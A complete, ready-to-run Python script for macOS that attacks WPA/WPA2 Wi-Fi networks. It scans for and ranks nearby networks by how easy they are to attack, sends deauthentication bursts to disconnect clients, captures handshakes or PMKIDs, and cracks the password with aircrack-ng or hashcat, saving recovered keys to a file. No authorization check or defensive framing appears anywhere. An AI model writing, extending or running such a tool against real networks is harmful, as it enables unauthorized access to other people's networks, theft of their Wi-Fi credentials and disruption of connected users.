#!/usr/bin/env python3
# wifi_attack.py — macOS WPA/WPA2 handshake + PMKID capture & crack
# deps: brew install aircrack-ng hcxtools
#       airport symlink: sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport

import subprocess
import os
import sys
import time
import signal
import json
import argparse
from pathlib import Path
from dataclasses import dataclass, asdict
from typing import Optional
from datetime import datetime

# ─── CONFIG ───────────────────────────────────────────────────────────────────
CAP_DIR       = str(Path.home() / "wifi_cap")
CAP_PREFIX    = "capture"
DEFAULT_WL    = str(Path(__file__).parent / "wordlist_en_id.txt")
SCAN_TIME     = 20
DEAUTH_BURSTS = 5
DEAUTH_COUNT  = 15
HANDSHAKE_TIMEOUT = 30
PMKID_TIMEOUT   = 15
# ──────────────────────────────────────────────────────────────────────────────


@dataclass
class Target:
    essid: str
    bssid: str
    channel: str
    enc: str
    rssi: int = -100
    clients: int = 0
    wpa3: bool = False
    pmf: bool = False
    pmkid_vuln: bool = False


@dataclass
class CaptureResult:
    cap_file: str
    handshake: bool = False
    pmkid: bool = False
    clients_seen: int = 0


def run(cmd: str, capture=False, check=False) -> subprocess.CompletedProcess:
    r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE if capture else None,
                       stderr=subprocess.PIPE if capture else subprocess.DEVNULL, text=True)
    if check and r.returncode != 0:
        raise subprocess.CalledProcessError(r.returncode, cmd, r.stdout, r.stderr)
    return r


def require_root():
    if os.geteuid() != 0:
        print("[-] run as root: sudo python3 wifi_attack.py")
        sys.exit(1)


AIRPORT_PATH = "/usr/local/bin/airport"

AIRPORT_AVAILABLE = Path(AIRPORT_PATH).exists()

def check_deps():
    missing = []
    for tool in ["aircrack-ng", "airodump-ng", "aireplay-ng", "hcxpcapngtool"]:
        r = run(f"which {tool}", capture=True)
        if not r.stdout.strip():
            missing.append(tool)
    if missing:
        print(f"[-] missing tools: {', '.join(missing)}")
        print("    brew install aircrack-ng hcxtools")
        sys.exit(1)
    if not AIRPORT_AVAILABLE:
        print("[!] airport not found at /usr/local/bin/airport (Apple removed it on newer macOS)")
        print("    scanning falls back to airodump-ng; channel lock / monitor / associate are best-effort")


def get_wifi_iface(prefer_external: bool = False) -> str:
    """Auto-detect Wi-Fi interface. prefer_external=True prefers USB adapters."""
    r = run("networksetup -listallhardwareports", capture=True)
    lines = r.stdout.splitlines()
    interfaces = []
    for i, line in enumerate(lines):
        if "Wi-Fi" in line or "AirPort" in line or "802.11" in line:
            for sub in lines[i:i+4]:
                if "Device:" in sub:
                    dev = sub.split("Device:")[-1].strip()
                    interfaces.append(dev)
    if not interfaces:
        return "en0"

    # Check for external USB adapters (typically en1, en2, etc. on macOS)
    if prefer_external:
        for iface in interfaces:
            if iface != "en0":
                # Verify it's actually a wireless interface
                r = run(f"networksetup -getairportpower {iface}", capture=True)
                if "Wi-Fi Power" in r.stdout or "AirPort Power" in r.stdout:
                    print(f"[+] using external adapter: {iface}")
                    return iface

    print(f"[+] using built-in interface: {interfaces[0]}")
    return interfaces[0]


def enable_monitor(iface: str) -> str:
    print(f"[*] disassociating {iface}...")
    if AIRPORT_AVAILABLE:
        run(f"{AIRPORT_PATH} {iface} -z")
    time.sleep(1)

    print(f"[*] enabling monitor mode on {iface}...")
    if AIRPORT_AVAILABLE:
        run(f"{AIRPORT_PATH} {iface} sniff 1")
    else:
        print("    [!] airport unavailable — airodump-ng will attempt monitor mode during capture")
    time.sleep(1)
    print(f"[+] monitor mode attempted on {iface}")
    return iface


def disable_monitor(iface: str):
    print(f"[*] restoring {iface}...")
    run(f"ifconfig {iface} down")
    run(f"ifconfig {iface} up")
    run("networksetup -detectnewhardware")


def parse_airport_scan(output: str) -> list[Target]:
    """Parse airport -s output with RSSI, channel, security detection."""
    networks = []
    lines = output.strip().splitlines()
    for line in lines[1:]:
        parts = line.split()
        if len(parts) < 7:
            continue
        bssid_idx = None
        for i, p in enumerate(parts):
            if len(p) == 17 and p.count(":") == 5:
                bssid_idx = i
                break
        if bssid_idx is None:
            continue
        essid = " ".join(parts[:bssid_idx])
        bssid = parts[bssid_idx]
        try:
            rssi = int(parts[bssid_idx + 1])
            channel = parts[bssid_idx + 2]
        except (IndexError, ValueError):
            rssi = -100
            channel = "?"
        sec = " ".join(parts[bssid_idx + 5:]) if bssid_idx + 5 < len(parts) else "?"

        # Detect WPA3/SAE and PMF
        sec_lower = sec.lower()
        wpa3 = "sae" in sec_lower or "wpa3" in sec_lower
        pmf = "pmf" in sec_lower or "mfp" in sec_lower or wpa3

        networks.append(Target(
            essid=essid, bssid=bssid, channel=channel, enc=sec,
            rssi=rssi, wpa3=wpa3, pmf=pmf
        ))
    return networks


def scan_networks(iface: str, duration: int = SCAN_TIME) -> list[Target]:
    print(f"[*] scanning for networks ({duration}s) via airodump-ng...")
    stamp = int(time.time())
    csv_prefix = f"/tmp/wifi_scan_{stamp}"
    run(f"timeout {duration} airodump-ng --output-format csv -w {csv_prefix} {iface}", capture=True)
    networks = []
    seen = set()
    csv_file = f"{csv_prefix}-01.csv"
    if Path(csv_file).exists():
        with open(csv_file) as f:
            for line in f:
                parts = [p.strip() for p in line.split(",")]
                if len(parts) < 14:
                    continue
                bssid = parts[0]
                if len(bssid) != 17 or bssid.count(":") != 5:
                    continue
                if bssid in seen:
                    continue
                channel = parts[3] if len(parts) > 3 and parts[3].isdigit() else "?"
                try:
                    rssi = int(parts[8]) if len(parts) > 8 and parts[8] and parts[8].lstrip("-").isdigit() else -100
                except (IndexError, ValueError):
                    rssi = -100
                sec = parts[5] if len(parts) > 5 else "?"
                essid = parts[13] if len(parts) > 13 else ""
                sec_lower = sec.lower()
                wpa3 = "sae" in sec_lower or "wpa3" in sec_lower
                pmf = "pmf" in sec_lower or "mfp" in sec_lower or wpa3
                seen.add(bssid)
                networks.append(Target(
                    essid=essid, bssid=bssid, channel=channel, enc=sec,
                    rssi=rssi, wpa3=wpa3, pmf=pmf
                ))
        for ext in ["-01.csv", "-01.kismet.csv", "-01.kismet.netxml", "-01.cap"]:
            Path(f"{csv_prefix}{ext}").unlink(missing_ok=True)

    # Enrich with client count via quick per-target airodump
    if networks:
        print("[*] enumerating clients...")
        for n in networks:
            try:
                safe = n.bssid.replace(":", "")
                run(f"timeout 8 airodump-ng -c {n.channel} --bssid {n.bssid} --output-format csv -w /tmp/scan_{safe} {iface}", capture=True)
                csv_file = f"/tmp/scan_{safe}-01.csv"
                if Path(csv_file).exists():
                    with open(csv_file) as f:
                        for line in f:
                            if n.bssid in line and "Station MAC" not in line:
                                parts = [p.strip() for p in line.strip().split(",")]
                                if len(parts) > 5 and parts[5] == n.bssid:
                                    n.clients += 1
                    Path(csv_file).unlink(missing_ok=True)
                    Path(f"/tmp/scan_{safe}-01.kismet.csv").unlink(missing_ok=True)
                    Path(f"/tmp/scan_{safe}-01.kismet.netxml").unlink(missing_ok=True)
            except Exception:
                pass

    # PMKID vulnerability: WPA2-PSK with roaming (no PMF, not WPA3)
    for n in networks:
        n.pmkid_vuln = (not n.wpa3 and not n.pmf and "wpa2" in n.enc.lower() and "psk" in n.enc.lower())

    return networks


def rank_targets(networks: list[Target]) -> list[Target]:
    """Sort by: has clients > PMKID vuln > signal strength > WPA2 > WPA3."""
    def score(n: Target) -> tuple:
        return (
            0 if n.clients > 0 else 1,          # clients first
            0 if n.pmkid_vuln else 1,           # PMKID vulnerable
            -n.rssi,                             # stronger signal
            0 if "wpa2" in n.enc.lower() else 1, # WPA2 before WPA3
            0 if not n.wpa3 else 1               # non-WPA3 first
        )
    return sorted(networks, key=score)


def pick_target(networks: list[Target], auto: bool = False) -> Target:
    ranked = rank_targets(networks)
    print(f"\n{'#':<4} {'BSSID':<20} {'CH':<4} {'RSSI':<6} {'CLI':<4} {'PMF':<4} {'PMKID':<6} {'WPA3':<5} {'ENC':<22} ESSID")
    print("─" * 100)
    for i, n in enumerate(ranked):
        pmf = "Y" if n.pmf else "N"
        pmkid = "Y" if n.pmkid_vuln else "N"
        wpa3 = "Y" if n.wpa3 else "N"
        enc = n.enc[:20]
        print(f"{i:<4} {n.bssid:<20} {n.channel:<4} {n.rssi:<6} {n.clients:<4} {pmf:<4} {pmkid:<6} {wpa3:<5} {enc:<22} {n.essid}")

    if auto:
        print(f"\n[+] auto-selected: {ranked[0].essid} ({ranked[0].bssid})")
        return ranked[0]

    while True:
        try:
            idx = int(input("\n[?] target index: "))
            if 0 <= idx < len(ranked):
                return ranked[idx]
        except (ValueError, KeyboardInterrupt):
            pass
        print("[-] invalid selection")


def verify_handshake(cap_file: str, bssid: str) -> bool:
    """Check if capture contains valid WPA handshake."""
    r = run(f"aircrack-ng \"{cap_file}\"", capture=True)
    return "WPA (1 handshake)" in r.stdout or "WPA (2 handshake)" in r.stdout or "WPA (3 handshake)" in r.stdout or "WPA (4 handshake)" in r.stdout


def verify_pmkid(cap_file: str) -> bool:
    """Check if capture contains PMKID."""
    r = run(f"hcxpcapngtool -o /tmp/pmkid_test.hc22000 \"{cap_file}\" 2>/dev/null", capture=True)
    if Path("/tmp/pmkid_test.hc22000").exists():
        with open("/tmp/pmkid_test.hc22000") as f:
            content = f.read()
        Path("/tmp/pmkid_test.hc22000").unlink(missing_ok=True)
        return "*PMKID*" in content
    return False


def capture_handshake(target: Target, iface: str, timeout: int = HANDSHAKE_TIMEOUT) -> CaptureResult:
    bssid, channel, essid = target.bssid, target.channel.strip(), target.essid
    Path(CAP_DIR).mkdir(parents=True, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    cap_out = f"{CAP_DIR}/{CAP_PREFIX}_{essid}_{bssid.replace(':', '')}_{timestamp}"

    print(f"[*] locking channel {channel}...")
    run(f"{AIRPORT_PATH} {iface} -c {channel}") if AIRPORT_AVAILABLE else print(f"    [!] airport unavailable — could not lock channel {channel}")
    time.sleep(1)

    print(f"[*] capturing → {essid} ({bssid}) ch{channel}")
    proc = subprocess.Popen(
        f"airodump-ng -c {channel} --bssid {bssid} -w {cap_out} {iface}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    clients_seen = 0
    handshake_got = False
    start = time.time()

    # Adaptive deauth: only if clients present
    if target.clients > 0:
        print(f"[*] {target.clients} client(s) associated — sending deauth bursts...")
        for burst in range(DEAUTH_BURSTS):
            time.sleep(3)
            run(f"aireplay-ng --deauth {DEAUTH_COUNT} -a {bssid} {iface}")
            print(f"    burst {burst+1}/{DEAUTH_BURSTS} sent")

            # Check for handshake early
            cap_files = sorted(Path(CAP_DIR).glob(f"{CAP_PREFIX}_{essid}_{bssid.replace(':', '')}_{timestamp}*.cap"))
            if cap_files and verify_handshake(str(cap_files[-1]), bssid):
                handshake_got = True
                print(f"    [+] handshake captured at burst {burst+1}")
                break
    else:
        print("[*] no clients associated — waiting for passive handshake...")
        time.sleep(timeout)

    # Final wait
    if not handshake_got:
        elapsed = time.time() - start
        remaining = max(0, timeout - elapsed)
        if remaining > 0:
            time.sleep(remaining)

    proc.terminate()
    proc.wait()

    cap_files = sorted(Path(CAP_DIR).glob(f"{CAP_PREFIX}_{essid}_{bssid.replace(':', '')}_{timestamp}*.cap"))
    if not cap_files:
        return CaptureResult(cap_file="", handshake=False, pmkid=False, clients_seen=clients_seen)

    cap_file = str(cap_files[-1])
    handshake = verify_handshake(cap_file, bssid)
    pmkid = verify_pmkid(cap_file)

    if handshake:
        print(f"[+] WPA handshake captured → {cap_file}")
    if pmkid:
        print(f"[+] PMKID captured → {cap_file}")
    if not handshake and not pmkid:
        print(f"[-] no handshake/PMKID captured → {cap_file}")

    return CaptureResult(cap_file=cap_file, handshake=handshake, pmkid=pmkid, clients_seen=clients_seen)


def capture_pmkid(target: Target, iface: str, timeout: int = PMKID_TIMEOUT) -> CaptureResult:
    """PMKID attack: associate + disassociate to force PMKID (no clients needed)."""
    bssid, channel, essid = target.bssid, target.channel.strip(), target.essid
    Path(CAP_DIR).mkdir(parents=True, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    cap_out = f"{CAP_DIR}/{CAP_PREFIX}_PMKID_{essid}_{bssid.replace(':', '')}_{timestamp}"

    print(f"\n[*] PMKID attack → {essid} ({bssid}) ch{channel}")
    run(f"{AIRPORT_PATH} {iface} -c {channel}") if AIRPORT_AVAILABLE else print(f"    [!] airport unavailable — could not lock channel {channel}")
    time.sleep(1)

    proc = subprocess.Popen(
        f"airodump-ng -c {channel} --bssid {bssid} -w {cap_out} {iface}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    # Association request to trigger PMKID (requires aireplay-ng fakeauth or wpa_supplicant)
    # On macOS, use airport to associate briefly
    print("[*] attempting association for PMKID...")
    for attempt in range(3):
        if AIRPORT_AVAILABLE:
            run(f"{AIRPORT_PATH} {iface} -A {bssid} -I {essid} 2>/dev/null")
            run(f"{AIRPORT_PATH} {iface} -z")  # disassociate
        time.sleep(2)

    time.sleep(timeout)
    proc.terminate()
    proc.wait()

    cap_files = sorted(Path(CAP_DIR).glob(f"{CAP_PREFIX}_PMKID_{essid}_{bssid.replace(':', '')}_{timestamp}*.cap"))
    if not cap_files:
        return CaptureResult(cap_file="", handshake=False, pmkid=False, clients_seen=0)

    cap_file = str(cap_files[-1])
    pmkid = verify_pmkid(cap_file)

    if pmkid:
        print(f"[+] PMKID captured → {cap_file}")
    else:
        print(f"[-] PMKID not captured → {cap_file}")

    return CaptureResult(cap_file=cap_file, handshake=False, pmkid=pmkid, clients_seen=0)


def crack_handshake(cap_file: str, target: Target, wordlist: str, extra_args: str = "") -> bool:
    bssid, essid = target.bssid, target.essid

    if not Path(wordlist).exists():
        print(f"[-] wordlist not found: {wordlist}")
        return False

    wl_lines = sum(1 for _ in open(wordlist))
    print(f"\n[*] cracking → wordlist: {wordlist} ({wl_lines:,} words)")

    # Try with ESSID filter first (faster)
    cmd = f'aircrack-ng -b "{bssid}" -e "{essid}" -w "{wordlist}" {extra_args} "{cap_file}"'
    result = run(cmd, capture=True)
    output = result.stdout or ""
    print(output)

    if "KEY FOUND" in output:
        for line in output.splitlines():
            if "KEY FOUND" in line:
                key = line.split("[")[-1].rstrip("]").strip()
                print("\n[+] ━━━━━━━━━━━━━━━━━━━━━━")
                print(f"    SSID : {essid}")
                print(f"    BSSID: {bssid}")
                print(f"    KEY  : {key}")
                print("[+] ━━━━━━━━━━━━━━━━━━━━━━")
                save_result(essid, bssid, key, "handshake")
                return True

    # Fallback: no ESSID filter (some captures miss ESSID)
    print("[-] retrying without ESSID filter...")
    cmd = f'aircrack-ng -b "{bssid}" -w "{wordlist}" {extra_args} "{cap_file}"'
    result = run(cmd, capture=True)
    output = result.stdout or ""
    print(output)

    if "KEY FOUND" in output:
        for line in output.splitlines():
            if "KEY FOUND" in line:
                key = line.split("[")[-1].rstrip("]").strip()
                print("\n[+] ━━━━━━━━━━━━━━━━━━━━━━")
                print(f"    SSID : {essid}")
                print(f"    BSSID: {bssid}")
                print(f"    KEY  : {key}")
                print("[+] ━━━━━━━━━━━━━━━━━━━━━━")
                save_result(essid, bssid, key, "handshake")
                return True

    return False


def crack_pmkid(cap_file: str, target: Target, wordlist: str) -> bool:
    """Crack PMKID using hashcat (aircrack-ng doesn't support PMKID directly)."""
    bssid, essid = target.bssid, target.essid
    hc_file = cap_file.replace(".cap", ".hc22000")

    print(f"[*] converting PMKID capture to hashcat format...")
    run(f"hcxpcapngtool -o {hc_file} {cap_file}")

    if not Path(hc_file).exists():
        print("[-] conversion failed")
        return False

    print(f"[+] ready for GPU crack (hashcat -m 22000):")
    print(f"    hashcat -m 22000 {hc_file} {wordlist}")

    # Try CPU crack with hashcat if available (no GPU)
    r = run("which hashcat", capture=True)
    if r.stdout.strip():
        print("[*] attempting CPU hashcat crack...")
        result = run(f"hashcat -m 22000 -a 0 {hc_file} {wordlist} --force", capture=True)
        output = result.stdout or ""
        print(output)
        if "KEY FOUND" in output or "Exhausted" not in output:
            # Parse hashcat output for key
            for line in output.splitlines():
                if ":" in line and bssid.replace(":", "") in line:
                    key = line.split(":")[-1].strip()
                    print("\n[+] ━━━━━━━━━━━━━━━━━━━━━━")
                    print(f"    SSID : {essid}")
                    print(f"    BSSID: {bssid}")
                    print(f"    KEY  : {key}")
                    print("[+] ━━━━━━━━━━━━━━━━━━━━━━")
                    save_result(essid, bssid, key, "pmkid")
                    return True

    return False


def save_result(essid: str, bssid: str, key: str, method: str):
    result_file = f"{CAP_DIR}/cracked.txt"
    with open(result_file, "a") as f:
        f.write(f"SSID={essid} | BSSID={bssid} | KEY={key} | METHOD={method} | TIME={datetime.now().isoformat()}\n")
    print(f"[+] saved → {result_file}")


def convert_to_hashcat(cap_file: str, wordlist: str):
    hc_file = cap_file.replace(".cap", ".hc22000")
    print(f"[*] converting to hashcat format → {hc_file}")
    run(f"hcxpcapngtool -o {hc_file} {cap_file}")

    if Path(hc_file).exists():
        print(f"[+] ready for GPU crack:")
        print(f"    hashcat -m 22000 {hc_file} {wordlist}")
    else:
        print("[-] conversion failed.")


def session_log(cap_dir: str, target: Target, result: CaptureResult, cracked: bool, key: str = ""):
    """Write JSON session log for post-analysis."""
    log_file = f"{cap_dir}/session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    log = {
        "timestamp": datetime.now().isoformat(),
        "target": asdict(target),
        "capture": asdict(result),
        "cracked": cracked,
        "key": key
    }
    with open(log_file, "w") as f:
        json.dump(log, f, indent=2)
    print(f"[+] session log → {log_file}")


def cleanup(iface: str, sig=None, frame=None):
    print("\n[*] cleaning up...")
    disable_monitor(iface)
    sys.exit(0)


def main():
    parser = argparse.ArgumentParser(description="macOS WPA/WPA2 Handshake + PMKID Capture & Crack")
    parser.add_argument("-i", "--interface", help="Wi-Fi interface (default: auto-detect)")
    parser.add_argument("-w", "--wordlist", default=DEFAULT_WL, help="Wordlist path")
    parser.add_argument("-a", "--auto", action="store_true", help="Auto-select best target")
    parser.add_argument("--pmkid-only", action="store_true", help="Only attempt PMKID attack")
    parser.add_argument("--handshake-only", action="store_true", help="Only attempt handshake capture")
    parser.add_argument("--no-crack", action="store_true", help="Capture only, no cracking")
    parser.add_argument("--external", action="store_true", help="Prefer external USB Wi-Fi adapter")
    parser.add_argument("--scan-time", type=int, default=SCAN_TIME, help="Scan duration in seconds")
    args = parser.parse_args()

    require_root()
    check_deps()

    iface = args.interface or get_wifi_iface(prefer_external=args.external)
    print(f"[+] interface: {iface}")

    signal.signal(signal.SIGINT, lambda s, f: cleanup(iface, s, f))

    enable_monitor(iface)

    networks = scan_networks(iface, args.scan_time)
    if not networks:
        print("[-] no networks found")
        cleanup(iface)

    # Filter out WPA3 by default (uncrackable)
    crackable = [n for n in networks if not n.wpa3]
    if not crackable:
        print("[-] all networks use WPA3/SAE — not crackable with this tool")
        cleanup(iface)

    target = pick_target(crackable, auto=args.auto)

    if target.wpa3:
        print("[-] target uses WPA3/SAE — skipping")
        cleanup(iface)

    print(f"\n[*] target locked: {target.essid} ({target.bssid}) ch{target.channel} RSSI={target.rssi}dBm clients={target.clients} PMF={'Y' if target.pmf else 'N'} PMKID_vuln={'Y' if target.pmkid_vuln else 'N'}")

    cracked = False
    key = ""
    capture_result = None

    # Strategy 1: PMKID if vulnerable (works without clients)
    if target.pmkid_vuln and not args.handshake_only:
        print("\n[*] target vulnerable to PMKID attack — attempting...")
        capture_result = capture_pmkid(target, iface)
        if capture_result.pmkid and not args.no_crack:
            cracked = crack_pmkid(capture_result.cap_file, target, args.wordlist)
            if cracked:
                key = "PMKID_CRACKED"  # actual key saved in crack_pmkid

    # Strategy 2: Handshake capture (needs clients or passive)
    if not cracked and not args.pmkid_only:
        capture_result = capture_handshake(target, iface)
        if capture_result.handshake and not args.no_crack:
            cracked = crack_handshake(capture_result.cap_file, target, args.wordlist)
            if cracked:
                key = "HANDSHAKE_CRACKED"

    # Strategy 3: If handshake captured but not cracked, convert for hashcat
    if capture_result and capture_result.cap_file and not cracked and not args.no_crack:
        print("\n[-] wordlist attack failed")
        convert_to_hashcat(capture_result.cap_file, args.wordlist)

    session_log(CAP_DIR, target, capture_result or CaptureResult(cap_file=""), cracked, key)
    cleanup(iface)


if __name__ == "__main__":
    main()